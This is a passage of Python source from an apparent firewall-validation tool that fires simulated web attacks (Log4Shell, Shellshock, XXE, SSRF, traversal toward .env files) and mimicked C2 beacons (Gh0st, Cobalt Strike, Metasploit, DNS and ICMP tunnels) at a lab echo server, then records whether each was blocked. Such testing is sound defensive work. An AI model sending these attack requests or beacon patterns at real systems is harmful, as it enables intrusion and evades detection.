        return text[:500]
    except Exception:
        try:
            return repr(resp.content[:500])
        except Exception:
            return ''

def _resp_headers(resp) -> dict:
    """Get response headers as dict."""
    try:
        return dict(resp.headers)
    except Exception:
        return {}


# ─── Security Test Engine ───────────────────────────────────

class SecurityTestEngine:
    def __init__(self, custom_store: Optional[CustomPatternStore] = None):
        self._results: Dict[str, SecurityTestResult] = {}
        self._baseline_results: Dict[str, SecurityTestResult] = {}
        self._current_mode: str = 'enforcement'
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._logs: List[str] = []
        self._lock = threading.Lock()
        self._url_map = dict(DEFAULT_URL_MAP)
        self._custom_store = custom_store
        self._test_map = dict(TEST_MAP)
        self._all_tests = list(ALL_TESTS)
        if custom_store:
            self._reload_custom()

    def _reload_custom(self):
        """Refresh test catalog with custom patterns and overrides."""
        self._all_tests = list(ALL_TESTS)
        self._test_map = dict(TEST_MAP)
        if self._custom_store:
            overrides = {}  # override_of test_id → custom pattern
            customs = []
            for p in self._custom_store.list():
                if p.get('override_of'):
                    overrides[p['override_of']] = p
                else:
                    customs.append(p)
            # Apply overrides — replace built-in tests in-place
            if overrides:
                new_all = []
                for t in self._all_tests:
                    if t.id in overrides:
                        p = overrides[t.id]
                        ot = SecurityTestCase(
                            id=t.id, name=p.get('name', t.name),
                            category=p.get('category', t.category),
                            description=p.get('description', t.description),
                            expected_action=p.get('expected_action', t.expected_action),
                            panos_feature=p.get('panos_feature', t.panos_feature),
                            custom=True, payload=p.get('payload', ''),
                            method=p.get('method', t.method),
                            headers=p.get('headers', {}),
                            target_path=p.get('target_path', t.target_path),
                        )
                        new_all.append(ot)
                        self._test_map[t.id] = ot
                    else:
                        new_all.append(t)
                self._all_tests = new_all
            # Add pure custom patterns
            for p in customs:
                tc = SecurityTestCase(
                    id=p['id'], name=p.get('name', 'Custom Test'),
                    category=p.get('category', 'web_attacks'),
                    description=p.get('description', ''),
                    expected_action=p.get('expected_action', 'block'),
                    panos_feature=p.get('panos_feature', 'Vulnerability Protection'),
                    custom=True, payload=p.get('payload', ''),
                    method=p.get('method', 'GET'),
                    headers=p.get('headers', {}),
                    target_path=p.get('target_path', '/echo'),
                )
                self._all_tests.append(tc)
                self._test_map[tc.id] = tc

    def reload_catalog(self):
        """Public method to refresh catalog after custom pattern CRUD."""
        self._reload_custom()

    def get_catalog(self) -> dict:
        """Return test catalog grouped by category."""
        self._reload_custom()
        # Build set of overridden test IDs
        overridden_ids = set()
        if self._custom_store:
            for p in self._custom_store.list():
                oid = p.get('override_of')
                if oid:
                    overridden_ids.add(oid)
        groups = {}
        for t in self._all_tests:
            if t.category not in groups:
                groups[t.category] = []
            is_builtin = t.id in TEST_MAP
            groups[t.category].append({
                'id': t.id, 'name': t.name, 'category': t.category,
                'description': t.description, 'expected_action': t.expected_action,
                'panos_feature': t.panos_feature, 'threat_id': t.threat_id,
                'custom': t.custom, 'editable': True,
                'overridden': t.id in overridden_ids,
                'builtin': is_builtin and not t.custom,
                'payload': ATTACK_PAYLOADS.get(t.id, t.payload if t.custom else ''),
                'method': t.method, 'headers': t.headers,
                'target_path': t.target_path,
            })
        return groups

    def start(self, test_ids: List[str], config: dict) -> tuple:
        """Start running selected tests. Returns (ok, message)."""
        if self._running:
            return False, 'Security tests already running'

        self._reload_custom()
        tests = [self._test_map[tid] for tid in test_ids if tid in self._test_map]
        if not tests:
            return False, 'No valid tests selected'

        # Update URL map if custom URLs provided
        custom_urls = config.get('url_map', {})
        self._url_map.update(custom_urls)

        host = config.get('host', os.environ.get('SERVER_HOST', 'server'))
        http_port = int(config.get('http_port', 9999))
        https_port = int(config.get('https_port', 443))
        interval = float(config.get('interval', 2))
        self._current_mode = config.get('mode', 'enforcement')

        # Mark selected tests as pending
        with self._lock:
            for t in tests:
                self._results[t.id] = SecurityTestResult(
                    test_id=t.id, test_name=t.name, category=t.category,
                    expected_action=t.expected_action, actual_result='pending',
                    verdict='PENDING', response_code=0, detail='Queued',
                    panos_feature=t.panos_feature, threat_id=t.threat_id,
                    timestamp=time.time(), description=t.description)

        self._stop_event.clear()
        self._running = True
        self._thread = threading.Thread(
            target=self._run_tests, args=(tests, host, http_port, https_port, interval),
            daemon=True)
        self._thread.start()
        self._add_log(f'Started {len(tests)} security tests against {host}')
        return True, f'Running {len(tests)} tests'

    def stop(self) -> tuple:
        if not self._running:
            return False, 'Not running'
        self._stop_event.set()
        self._running = False
        self._add_log('Security tests stopped')
        return True, 'Stopped'

    def clear(self):
        with self._lock:
            self._results.clear()
            self._baseline_results.clear()
            self._logs.clear()

    def get_status(self) -> dict:
        with self._lock:
            results = []
            for r in self._results.values():
                results.append({
                    'test_id': r.test_id, 'test_name': r.test_name,
                    'category': r.category, 'expected_action': r.expected_action,
                    'actual_result': r.actual_result, 'verdict': r.verdict,
                    'response_code': r.response_code, 'detail': r.detail,
                    'panos_feature': r.panos_feature, 'threat_id': r.threat_id,
                    'timestamp': r.timestamp,
                    'description': r.description, 'payload': r.payload,
                    'url': r.url, 'method': r.method,
                    'expected_behavior': r.expected_behavior,
                    'response_body_snippet': r.response_body_snippet,
                    'response_headers': r.response_headers,
                    'verdict_explanation': r.verdict_explanation,
                })
            total = len(results)
            passed = sum(1 for r in results if r['verdict'] == 'PASS')
            failed = sum(1 for r in results if r['verdict'] == 'FAIL')
            errors = sum(1 for r in results if r['verdict'] == 'ERROR')
            pending = sum(1 for r in results if r['verdict'] == 'PENDING')
        return {
            'running': self._running,
            'results': results,
            'logs': list(self._logs[-100:]),
            'summary': {'total': total, 'passed': passed, 'failed': failed,
                        'errors': errors, 'pending': pending},
        }

    def get_comparison(self) -> dict:
        """Return baseline vs enforcement comparison for all tests."""
        def _result_dict(r):
            return {
                'test_id': r.test_id, 'test_name': r.test_name,
                'category': r.category, 'verdict': r.verdict,
                'actual_result': r.actual_result,
                'detail': r.detail, 'response_code': r.response_code,
                'panos_feature': r.panos_feature, 'threat_id': r.threat_id,
                'verdict_explanation': r.verdict_explanation,
            }
        with self._lock:
            comparison = {}
            all_ids = set(list(self._baseline_results.keys()) + list(self._results.keys()))
            for tid in all_ids:
                entry = {'test_id': tid}
                if tid in self._baseline_results:
                    entry['baseline'] = _result_dict(self._baseline_results[tid])
                    entry['test_name'] = self._baseline_results[tid].test_name
                    entry['category'] = self._baseline_results[tid].category
                if tid in self._results:
                    entry['enforcement'] = _result_dict(self._results[tid])
                    entry['test_name'] = self._results[tid].test_name
                    entry['category'] = self._results[tid].category
                comparison[tid] = entry
        return {
            'comparison': comparison,
            'has_baseline': len(self._baseline_results) > 0,
            'has_enforcement': len(self._results) > 0,
            'baseline_count': len(self._baseline_results),
            'enforcement_count': len(self._results),
        }

    def _add_log(self, msg: str):
        with self._lock:
            ts = time.strftime('%H:%M:%S')
            self._logs.append(f'[{ts}] {msg}')
            if len(self._logs) > 500:
                self._logs = self._logs[-250:]
        log.info(msg)

    def _run_tests(self, tests, host, http_port, https_port, interval):
        """Execute tests sequentially."""
        is_baseline = self._current_mode == 'baseline'
        mode_label = 'BASELINE' if is_baseline else 'ENFORCEMENT'
        self._add_log(f'Mode: {mode_label}')
        for test in tests:
            if self._stop_event.is_set():
                break
            self._add_log(f'Running: {test.name}')
            try:
                result = self._execute_test(test, host, http_port, https_port)
                # In baseline mode, invert verdicts and store separately
                if is_baseline:
                    if result.actual_result == 'passed_through':
                        result.verdict = 'PASS'
                        result.verdict_explanation = (
                            'BASELINE PASS — Attack passed through as expected (no security profiles). '
                            'This confirms connectivity to the server is working.')
                    elif result.actual_result == 'blocked':
                        result.verdict = 'FAIL'
                        result.verdict_explanation = (
                            'BASELINE FAIL — Attack was blocked even without security profiles enabled. '
                            'Check if security profiles are still attached or another device is blocking.')
                    with self._lock:
                        self._baseline_results[test.id] = result
                else:
                    with self._lock:
                        self._results[test.id] = result
                verdict_msg = f'{test.name} → {result.verdict}'
                if result.verdict == 'PASS':
                    verdict_msg += ' (blocked by firewall)'
                elif result.verdict == 'FAIL':
                    verdict_msg += ' (passed through — not blocked)'
                self._add_log(verdict_msg)
                # Log full test case details
                self._add_log(f'  Method: {result.method} | URL: {result.url}')
                if result.payload:
                    payload_display = result.payload[:200] + ('...' if len(result.payload) > 200 else '')
                    self._add_log(f'  Payload: {payload_display}')
                self._add_log(f'  HTTP {result.response_code} | {result.detail}')
                if result.response_body_snippet:
                    snippet = result.response_body_snippet[:150].replace('\n', ' ')
                    self._add_log(f'  Response: {snippet}')
                self._add_log(f'  PAN-OS: {result.panos_feature} | {result.expected_behavior[:120] if result.expected_behavior else ""}')
            except Exception as e:
                with self._lock:
                    self._results[test.id] = self._error_result(test, str(e))
                self._add_log(f'{test.name} → ERROR: {e}')

            if not self._stop_event.is_set():
                time.sleep(interval)

        self._running = False
        self._add_log('Security test run complete')

    def _execute_test(self, test: SecurityTestCase, host: str,
                      http_port: int, https_port: int) -> SecurityTestResult:
        """Run a single test and determine verdict."""
        if test.custom:
            # Overridden built-in tests: check if the original ID maps to a built-in
            # If so, still use custom handler (user edited payload/method)
            return self._test_custom(test, host, http_port)
        if test.category == 'web_attacks':
            return self._test_web_attack(test, host, http_port)
        elif test.category == 'malware_threats':
            return self._test_malware(test, host, http_port, https_port)
        elif test.category == 'url_filtering':
            return self._test_url_filtering(test)
        elif test.category == 'dns_attacks':
            return self._test_dns_attack(test, host)
        elif test.category == 'protocol_abuse':
            return self._test_protocol_abuse(test, host, http_port)
        elif test.category == 'file_threats':
            return self._test_file_threat(test, host, http_port)
        elif test.category == 'ssl_decryption':
            return self._test_ssl_decryption(test, host, https_port)
        elif test.category == 'appid_validation':
            return self._test_appid_validation(test, host, https_port)
        elif test.category == 'data_exfiltration':
            return self._test_data_exfiltration(test, host, http_port)
        elif test.category == 'evasion_techniques':
            return self._test_evasion_technique(test, host, http_port)
        elif test.category == 'credential_phishing':
            return self._test_credential_phishing(test, host, http_port)
        elif test.category == 'encrypted_dns':
            return self._test_encrypted_dns(test, host, http_port)
        elif test.category == 'spyware_phonehome':
            return self._test_spyware_phonehome(test, host, http_port)
        elif test.category == 'cve_exploits':
            return self._test_cve_exploit(test, host, http_port)
        elif test.category == 'brute_force':
            return self._test_brute_force(test, host, http_port)
        elif test.category == 'file_blocking':
            return self._test_file_blocking(test, host, http_port)
        elif test.category == 'wildfire_analysis':
            return self._test_wildfire(test, host, http_port)
        elif test.category == 'cryptomining':
            return self._test_cryptomining(test, host, http_port)
        elif test.category == 'ransomware':
            return self._test_ransomware(test, host, http_port)
        else:
            return self._error_result(test, f'Unknown category: {test.category}')

    def _test_custom(self, test: SecurityTestCase, host: str,
                     port: int) -> SecurityTestResult:
        """Execute a custom attack pattern."""
        payload = test.payload
        url = f'http://{host}:{port}{test.target_path}'
        method = test.method.upper()
        try:
            if method == 'POST':
                resp = requests.post(url, data=payload,
                    headers=test.headers or {}, timeout=10)
            else:
                # Use raw socket to send exact payload characters without URL encoding
                path_query = f'{test.target_path}?payload={payload}'
                resp = _raw_http_get(host, port, path_query,
                    extra_headers=test.headers or None, timeout=10)
            return self._analyze_response(test, resp, payload,
                url=url, method=method, sent_payload=payload)
        except (requests.ConnectionError, requests.Timeout,
                socket.timeout, ConnectionResetError, ConnectionRefusedError,
                BrokenPipeError, OSError) as e:
            return self._blocked_result(test, str(e),
                url=url, method=method, sent_payload=payload)

    def _test_web_attack(self, test: SecurityTestCase, host: str,
                         port: int) -> SecurityTestResult:
        """Send attack payload to echo server and check if blocked."""
        payload = ATTACK_PAYLOADS.get(test.id, '')
        url = f'http://{host}:{port}/echo'

        if test.id == 'log4shell':
            method = 'GET'
            try:
                resp = requests.get(url, params={'payload': 'test'},
                    headers={'X-Api-Version': payload, 'User-Agent': payload},
                    timeout=10)
                # Payload is in HTTP headers (X-Api-Version, User-Agent), NOT in body.
                # The echo server only echoes the ?payload= query param ("test"), so
                # _analyze_response would never find the JNDI marker in the body.
                # If firewall allows the request → HTTP 200 → FAIL.
                if self._is_block_page(resp):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Block page detected for Log4Shell',
                        resp.status_code, resp=resp, url=url, method=method, sent_payload=payload)
                if resp.status_code in (403, 406, 502, 503, 504):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Log4Shell header blocked',
                        resp.status_code, resp=resp, url=url, method=method, sent_payload=payload)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Request with JNDI lookup in headers accepted — Vulnerability Protection did not detect Log4Shell pattern',
                        resp=resp, url=url, method=method, sent_payload=payload)
                return self._passthrough_result(test, resp.status_code,
                    f'HTTP {resp.status_code} — Log4Shell header not blocked',
                    resp=resp, url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'shellshock':
            method = 'GET'
            try:
                resp = requests.get(url, params={'payload': 'test'},
                    headers={'User-Agent': payload, 'Referer': payload},
                    timeout=10)
                # Payload is in User-Agent and Referer headers, NOT in body.
                # Echo server only echoes ?payload= ("test"), so marker never in body.
                # If firewall allows the request → HTTP 200 → FAIL.
                if self._is_block_page(resp):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Block page detected for Shellshock',
                        resp.status_code, resp=resp, url=url, method=method, sent_payload=payload)
                if resp.status_code in (403, 406, 502, 503, 504):
                    return self._blocked_result(test,
                        f'HTTP {resp.status_code} — Shellshock header blocked',
                        resp.status_code, resp=resp, url=url, method=method, sent_payload=payload)
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Request with Shellshock pattern in headers accepted — Vulnerability Protection did not detect CVE-2014-6271',
                        resp=resp, url=url, method=method, sent_payload=payload)
                return self._passthrough_result(test, resp.status_code,
                    f'HTTP {resp.status_code} — Shellshock header not blocked',
                    resp=resp, url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'xxe':
            method = 'POST'
            try:
                resp = requests.post(url, data=payload,
                    headers={'Content-Type': 'application/xml'}, timeout=10)
                return self._analyze_response(test, resp, 'xxe',
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'deserialization':
            method = 'POST'
            try:
                resp = requests.post(url, data=payload,
                    headers={'Content-Type': 'application/x-java-serialized-object'}, timeout=10)
                return self._analyze_response(test, resp, 'rO0AB',
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

        elif test.id == 'crlf_injection':
            method = 'GET'
            crlf_url = f'http://{host}:{port}/echo?payload={payload}'
            path_query = f'/echo?payload={payload}'
            try:
                resp = _raw_http_get(host, port, path_query, timeout=10)
                return self._analyze_response(test, resp, 'Set-Cookie',
                    url=crlf_url, method=method, sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=crlf_url, method=method, sent_payload=payload)

        elif test.id == 'ssrf':
            method = 'GET'
            raw_url = f'{url}?url={payload}&payload={payload}'
            path_query = f'/echo?url={payload}&payload={payload}'
            try:
                resp = _raw_http_get(host, port, path_query, timeout=10)
                return self._analyze_response(test, resp, '169.254',
                    url=raw_url, method=method, sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=raw_url, method=method, sent_payload=payload)

        elif test.id == 'open_redirect':
            method = 'GET'
            raw_url = f'{url}?payload={payload}&redirect={payload}&url={payload}&next={payload}'
            path_query = f'/echo?payload={payload}&redirect={payload}&url={payload}&next={payload}'
            try:
                resp = _raw_http_get(host, port, path_query, timeout=10)
                return self._analyze_response(test, resp, 'evil.example.com',
                    url=raw_url, method=method, sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=raw_url, method=method, sent_payload=payload)

        elif test.id == 'info_disclosure':
            # Send info disclosure paths as URL parameters so firewall inspects them.
            # The firewall should detect access attempts to sensitive paths like .env, .git/config.
            # We send the paths in the URL query AND as path segments for maximum signature coverage.
            paths = payload.split('|')
            method = 'GET'
            for p in paths:
                p = p.strip()
                # Send as URL parameter through echo server (firewall inspects URL)
                disc_url = f'http://{host}:{port}/echo?payload=/{p}&file=/{p}&path=/{p}'
                try:
                    resp = requests.get(disc_url, timeout=5)
                    if self._is_block_page(resp):
                        return self._blocked_result(test,
                            f'Block page detected for /{p}', resp.status_code,
                            resp=resp, url=disc_url, method=method, sent_payload=payload)
                    if resp.status_code in (403, 406, 502, 503, 504):
                        return self._blocked_result(test,
                            f'HTTP {resp.status_code} — /{p} blocked', resp.status_code,
                            resp=resp, url=disc_url, method=method, sent_payload=payload)
                except (requests.ConnectionError, requests.Timeout, OSError) as e:
                    return self._blocked_result(test, str(e),
                        url=disc_url, method=method, sent_payload=payload)

            # None of the paths triggered a block — try as actual path traversals
            for p in paths:
                p = p.strip()
                trav_url = f'http://{host}:{port}/{p}'
                try:
                    resp = requests.get(trav_url, timeout=5)
                    if self._is_block_page(resp):
                        return self._blocked_result(test,
                            f'Block page for /{p}', resp.status_code,
                            resp=resp, url=trav_url, method=method, sent_payload=payload)
                    if resp.status_code in (403, 406, 502, 503, 504):
                        return self._blocked_result(test,
                            f'HTTP {resp.status_code} — /{p} blocked', resp.status_code,
                            resp=resp, url=trav_url, method=method, sent_payload=payload)
                except (requests.ConnectionError, requests.Timeout, OSError) as e:
                    return self._blocked_result(test, str(e),
                        url=trav_url, method=method, sent_payload=payload)

            return self._passthrough_result(test, 200,
                'All info disclosure paths accessible — Vulnerability Protection did not block access to sensitive paths',
                url=f'http://{host}:{port}/[multiple paths]', method=method, sent_payload=payload)

        elif test.id == 'file_inclusion':
            method = 'GET'
            raw_url = f'{url}?payload={payload}&page={payload}&file={payload}'
            path_query = f'/echo?payload={payload}&page={payload}&file={payload}'
            try:
                resp = _raw_http_get(host, port, path_query, timeout=10)
                return self._analyze_response(test, resp, 'evil.example.com',
                    url=raw_url, method=method, sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=raw_url, method=method, sent_payload=payload)

        elif test.id == 'path_traversal':
            trav_url = f'http://{host}:{port}/{payload}'
            method = 'GET'
            path_query = f'/{payload}'
            try:
                resp = _raw_http_get(host, port, path_query, timeout=10)
                return self._analyze_response(test, resp, payload,
                    url=trav_url, method=method, sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=trav_url, method=method, sent_payload=payload)

        else:
            # Default: send payload via raw socket (sqli, xss, cmdi, ssti, ldap, xpath, blind_sqli)
            # Raw socket ensures attack characters like < > ' " ; | reach the firewall
            # exactly as-is on the wire — requests.get() would URL-encode them, which can
            # prevent IPS signatures from matching (e.g., <script> becomes %3Cscript%3E)
            method = 'GET'
            raw_url = f'{url}?payload={payload}'
            path_query = f'/echo?payload={payload}'
            try:
                resp = _raw_http_get(host, port, path_query, timeout=10)
                return self._analyze_response(test, resp, payload,
                    url=raw_url, method=method, sent_payload=payload)
            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
                    BrokenPipeError, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=raw_url, method=method, sent_payload=payload)

    def _test_malware(self, test: SecurityTestCase, host: str,
                      http_port: int, https_port: int) -> SecurityTestResult:
        """Test malware/threat detection."""
        if test.id == 'eicar_http':
            url = f'http://{host}:{http_port}/eicar'
            payload = 'EICAR test file download'
            try:
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR test file downloaded successfully — Anti-Virus did not block it',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                # HTTP 200 but no EICAR = firewall stripped the malware content
                if resp.status_code == 200:
                    return self._blocked_result(test,
                        'HTTP 200 but EICAR content stripped — Anti-Virus removed the malware from the response',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'eicar_https':
            url = f'https://{host}:{https_port}/eicar'
            payload = 'EICAR test file download (HTTPS)'
            try:
                resp = requests.get(url, timeout=10, verify=False)
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR downloaded over HTTPS — SSL Decryption may not be enabled or Anti-Virus profile not attached',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                if resp.status_code == 200:
                    return self._blocked_result(test,
                        'HTTP 200 but EICAR content stripped over HTTPS — SSL Decryption + Anti-Virus working',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'eicar_zip':
            url = f'http://{host}:{http_port}/eicar.zip'
            payload = 'EICAR in ZIP archive download'
            try:
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200 and len(resp.content) > 0:
                    try:
                        with zipfile.ZipFile(io.BytesIO(resp.content)) as zf:
                            if 'eicar.com' in zf.namelist():
                                return self._passthrough_result(test, resp.status_code,
                                    'EICAR ZIP downloaded — Anti-Virus did not block archive',
                                    resp=resp, url=url, method='GET', sent_payload=payload)
                    except zipfile.BadZipFile:
                        # Firewall corrupted/stripped the ZIP content
                        return self._blocked_result(test,
                            'Downloaded content is not a valid ZIP — Anti-Virus stripped or modified the archive',
                            resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                # 200 but empty body = content stripped
                if resp.status_code == 200 and len(resp.content) == 0:
                    return self._blocked_result(test,
                        'HTTP 200 but empty response — Anti-Virus stripped the EICAR ZIP',
                        resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'c2_callback':
            url = f'http://{host}:{http_port}/echo'
            # Use Gh0st RAT magic header bytes — PAN-OS Threat ID 10825
            # Gh0st RAT starts TCP with 5-byte magic "Gh0st" + 4-byte length
            c2_data = 'Gh0st\x00\x00\x00\x48\x00\x00\x00\x36\x78\x9c' + 'A' * 50
            payload = c2_data
            try:
                resp = requests.post(url, data=c2_data,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
                        'Content-Type': 'application/octet-stream',
                        'X-Request-ID': 'deadbeef-cafe-babe-feed-c0ffee000001',
                    }, timeout=10)
                # If 200, C2 callback went through — the echo server will echo it back
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'C2 beacon callback POST accepted (HTTP 200) — Anti-Spyware may have alerted but did not block. '
                        'Change Anti-Spyware profile action from "alert" to "reset-both" for spyware severity medium/high/critical',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, '',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'malicious_ua':
            url = f'http://{host}:{http_port}/echo?payload=test'
            # Use known malicious User-Agents from PAN-OS Threat Vault
            # "Cobalt Strike" UA pattern (Threat ID 86294) + ZXShell (Threat ID 13020)
            payload = 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; NativeHost)'
            try:
                # Send with multiple known-bad UAs to maximize detection
                resp = _raw_http_get(host, http_port, '/echo?payload=test',
                    extra_headers={
                        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; NativeHost)',
                        'Cookie': 'SESSIONID=' + 'A' * 128,
                    }, timeout=10)
                # Payload is in the User-Agent header, not the body.
                # If we get a 200, the firewall did NOT detect the malicious UA.
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Request with CobaltStrike User-Agent accepted (HTTP 200) — Anti-Spyware may have alerted but did not block. '
                        'Change Anti-Spyware profile action from "alert" to "reset-both" for spyware severity medium/high/critical',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, '',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'c2_cobalt_strike':
            import random
            sid = str(random.randint(1000000000, 9999999999))
            url = f'http://{host}:{http_port}/submit.php?id={sid}'
            payload = ATTACK_PAYLOADS.get(test.id, '')
            try:
                resp = requests.post(url,
                    data='eyJjb21tYW5kIjoiYmVhY29uIiwiaWQiOiIxMjM0In0=',
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0)',
                        'Cookie': f'SESSIONID={sid};DM=YWRtaW46cGFzc3dvcmQ=',
                        'Accept': '*/*',
                        'Cache-Control': 'no-cache',
                    }, timeout=10)
                # If we get 200, the C2 beacon callback was not blocked
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Cobalt Strike beacon POST to /submit.php accepted (HTTP 200) — Anti-Spyware may have alerted but did not block. '
                        'Change Anti-Spyware profile action from "alert" to "reset-both" for spyware severity medium/high/critical',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, '',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'c2_metasploit':
            import random, string
            uri = '/' + ''.join(random.choices(string.ascii_letters, k=4))
            url = f'http://{host}:{http_port}{uri}'
            payload = ATTACK_PAYLOADS.get(test.id, '')
            pe_body = b'MZ' + b'\x90' * 64 + b'\x00' * 64
            try:
                resp = requests.post(url, data=pe_body,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
                        'Content-Type': 'application/octet-stream',
                        'Connection': 'Keep-Alive',
                    }, timeout=10)
                # If we get a 200 response, the C2 beacon POST went through undetected
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'Metasploit reverse HTTP POST with PE payload accepted (HTTP 200) — Anti-Spyware may have alerted but did not block. '
                        'Change Anti-Spyware profile action from "alert" to "reset-both" for spyware severity medium/high/critical',
                        resp=resp, url=url, method='POST', sent_payload=payload)
                return self._analyze_response(test, resp, '',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'c2_dns_c2':
            payload = ATTACK_PAYLOADS.get(test.id, '')
            domains = payload.split('|')
            blocked_count = 0
            sinkholed_count = 0
            all_output = []
            for domain in domains:
                output, blocked, sinkholed, error = self._dns_query(host, domain, qtype='TXT')
                all_output.append(f'{domain}: {"BLOCKED" if blocked else "SINKHOLED" if sinkholed else "RESOLVED"}')
                if blocked:
                    blocked_count += 1
                if sinkholed:
                    sinkholed_count += 1
            detail_str = '; '.join(all_output)
            if blocked_count + sinkholed_count >= 2:
                return self._blocked_result(test,
                    f'DNS C2 queries intercepted ({blocked_count} blocked, {sinkholed_count} sinkholed): {detail_str}',
                    url=f'DNS TXT @{host}', method='DNS', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'DNS C2 queries resolved — not blocked (may be alert-only): {detail_str}. '
                'Change Anti-Spyware DNS signature action from "alert" to "sinkhole" for C2 domains',
                url=f'DNS TXT @{host}', method='DNS', sent_payload=payload)

        elif test.id == 'c2_icmp_tunnel':
            payload = ATTACK_PAYLOADS.get(test.id, '')
            try:
                data = b'ICMP-TUNNEL:' + b'A' * 64
                result = subprocess.run(
                    ['sudo', 'hping3', '--icmp', '-c', '3', '-d', str(len(data)),
                     '--data', str(len(data)), host],
                    capture_output=True, text=True, timeout=15)
                output = result.stdout + result.stderr
                if '100% packet loss' in output or result.returncode != 0:
                    return self._blocked_result(test,
                        f'ICMP packets dropped/blocked: {output[:200]}',
                        url=f'ICMP {host}', method='ICMP', sent_payload=payload)
                return self._passthrough_result(test, 0,
                    f'ICMP tunnel packets delivered: {output[:200]}',
                    url=f'ICMP {host}', method='ICMP', sent_payload=payload)
            except (subprocess.TimeoutExpired, FileNotFoundError) as e:
                return self._blocked_result(test, f'ICMP blocked or hping3 unavailable: {e}',
                    url=f'ICMP {host}', method='ICMP', sent_payload=payload)

        elif test.id == 'c2_http_beacon':
            payload = ATTACK_PAYLOADS.get(test.id, '')
            url = f'http://{host}:{http_port}/echo'
            uas = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
